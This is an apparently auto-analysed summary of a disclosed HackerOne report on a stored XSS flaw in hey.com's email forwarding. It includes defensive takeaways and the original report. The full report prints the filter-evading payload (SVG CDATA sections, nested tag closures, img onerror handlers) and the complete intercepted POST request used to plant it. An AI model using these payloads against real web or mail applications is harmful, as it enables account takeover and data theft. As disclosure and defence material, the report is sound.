# Stored XSS in hey.com Message Content via Email Forwarding

## Metadata
- **Source:** HackerOne
- **Report:** 988272 | https://hackerone.com/reports/988272
- **Submitted:** 2020-09-22
- **Reporter:** carbon61
- **Program:** Hey.com
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Stored Cross-Site Scripting (XSS), Improper Input Validation, Unsafe HTML Handling
- **CVEs:** None
- **Category:** web-api

## Summary
A stored XSS vulnerability exists in the message[content] parameter when forwarding emails or saving drafts. Attackers can inject malicious HTML/JavaScript payloads that execute when victims view the email, potentially allowing data theft and unauthorized actions. The vulnerability bypasses initial sanitization through nested HTML/SVG structures and CDATA sections.

## Attack scenario
1. Attacker creates a hey.com account and authenticates to the platform
2. Attacker forwards an email to a victim's account while intercepting the HTTP request
3. Attacker modifies the message[content] parameter to include XSS payload with img onerror handlers and SVG CDATA injection
4. Attacker sends the malicious message to the victim account
5. Victim receives the email and clicks to view it in their inbox
6. XSS payload executes in victim's browser context, allowing credential theft or account takeover (conditional on CSP bypass)

## Root cause
Insufficient input sanitization and output encoding of the message[content] parameter. The application fails to properly strip or escape HTML tags and event handlers. The use of nested HTML structures, SVG elements, and CDATA sections allows attackers to obfuscate payloads and bypass basic sanitization filters. Server-side HTML parsing does not adequately validate or neutralize potentially dangerous constructs before storage.

## Attacker mindset
The attacker demonstrates sophisticated understanding of XSS filter evasion techniques, including SVG/CDATA injection, nested HTML closure, and onerror event handler exploitation. They recognize the application's CSP protections exist and intentionally submit a partial PoC, planning to iterate on CSP bypass techniques. This suggests methodical reconnaissance and incremental vulnerability chain building.

## Defensive takeaways
- Implement strict Content Security Policy with 'unsafe-inline' removed and use nonces for legitimate inline scripts
- Use a robust server-side HTML sanitization library (e.g., DOMPurify on backend, OWASP Java HTML Sanitizer) with strict allowlist approach
- Apply context-aware output encoding for all user-controlled content before rendering
- Disable dangerous HTML elements (script, iframe, svg with event handlers) and event handlers (onerror, onload, etc.)
- Validate and sanitize message content before storage, not just at display time
- Implement automated security testing to detect XSS in email forwarding and draft functionality
- Use X-Content-Type-Options: nosniff and X-Frame-Options headers to prevent content type confusion
- Consider using a dedicated email sanitization library designed for email message handling

## Variant hunting
Search for similar stored XSS in: (1) other email forwarding/sharing mechanisms, (2) draft composition endpoints, (3) message preview functionality, (4) email template/signature fields, (5) reply/reply-all functionality, (6) bulk message operations, (7) any user-to-user messaging features accepting rich content

## MITRE ATT&CK
- T1190
- T1566.002
- T1598.003
- T1539
- T1562.008

## Notes
Reporter notes CSP is in place (script-src 'self' and specific external domains) but was not fully evaluating CSP bypass in initial submission. This is a partial PoC demonstrating the core stored XSS vulnerability with acknowledged CSP protection layer still in place. The complexity of the payload using SVG CDATA, nested HTML closures, and multiple onerror event handlers indicates deliberate filter evasion. Impact is conditioned on CSP bypass but vulnerability is critical as it affects email content handling - a core functionality.

## Full report
<details><summary>Expand</summary>

Hi 
I found a stored xss using ``` message[content] ``` parameter when forwarding an email or saving it as draft ,  and when the victim click on the email to view it, it gets executed .

I used this payload as the message content :
````
From: "f" <[]@hey.com>
To: dcdcsdcsdckhbdsckhb@kjbskjbcsd.com
Message-ID: <3654584aa703ca2fd963856f8495669174ef673f@hey.com>
Subject: <img src=wczxzx onerror=alert(1)>
Mime-Version: 1.0

    </style>
    </div>
    <svg><![CDATA[><table background="]])><img src=xx:x onerror=alert(2)//"></svg>
    <li style=onesr: src= cxxc=></li>
    style>
</style>
  </head>
<style></style>
  <body>

<svg><![CDATA[><image xlink: src="]]><img src=xx:x onerror=alert(2)//"></svg>
<li style=onerror:jkj/onerror=alert(1); =''ds></li>
    </div>
  </body>
</html>
```

#Note:
 i submitted this stored xss without the CSP bypass just to try not to get a duplicate , i will try to bypass the CSP and let you know.

##Steps To Reproduce:
1- make two accounts and login to the first one 
2- go to any email and forward it to the second email account and intercept the request and change it like this:
```
POST /messages HTTP/1.1
Host: app.hey.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html; page-update, text/html, application/xhtml+xml
Accept-Language: ar,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://app.hey.com/entries/[]/forwards/new
X-CSRF-Token: []
Content-Type: multipart/form-data; boundary=---------------------------392581797716153644644274802600
Origin: https://app.hey.com
Content-Length: 1156
DNT: 1
Connection: close


-----------------------------392581797716153644644274802600
Content-Disposition: form-data; name="acting_user_id"

{acting_user_id}
-----------------------------392581797716153644644274802600
Content-Disposition: form-data; name="entry[addressed][directly][]"

[second-email]@hey.com
-----------------------------392581797716153644644274802600
Content-Disposition: form-data; name="message[subject]"

Fwd: csdc
-----------------------------392581797716153644644274802600
Content-Disposition: form-data; name="message[content]"

From: "f" <[]@hey.com>
To: dcdcsdcsdckhbdsckhb@kjbskjbcsd.com
Message-ID: <3654584aa703ca2fd963856f8495669174ef673f@hey.com>
Subject: <img src=wczxzx onerror=alert(1)>
Mime-Version: 1.0

    </style>
    </div>
    <svg><![CDATA[><table background="]])><img src=xx:x onerror=alert(2)//"></svg>
    <li style=onesr: src= cxxc=></li>
    style>
</style>
  </head>
<style></style>
  <body>

<svg><![CDATA[><image xlink: src="]]><img src=xx:x onerror=alert(2)//"></svg>
<li style=onerror:jkj/onerror=alert(1); =''ds></li>
    </div>
  </body>
</html>
-----------------------------392581797716153644644274802600
Content-Disposition: form-data; name="_method"

post
-----------------------------392581797716153644644274802600--

```

3- go to the second email ``` Imbox ``` and click on the email to view it 
4- use the right click on email content to get the devtools and if you view the chrome console you can see the 
```
about:blank:1 Refused to execute inline event handler
 because it violates the following Content Security Policy
 directive: "script-src 'self' https://production.haystack-assets.com *.braintreegateway.com *.braintree-api.com hcaptcha.com *.hcaptcha.com". Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution.
```

## Impact

using this xss + CSP bypass the attacker can steal data and perform unwanted actions on a victim's behalf.

</details>

---
*Analysed by Claude on 2026-05-12*
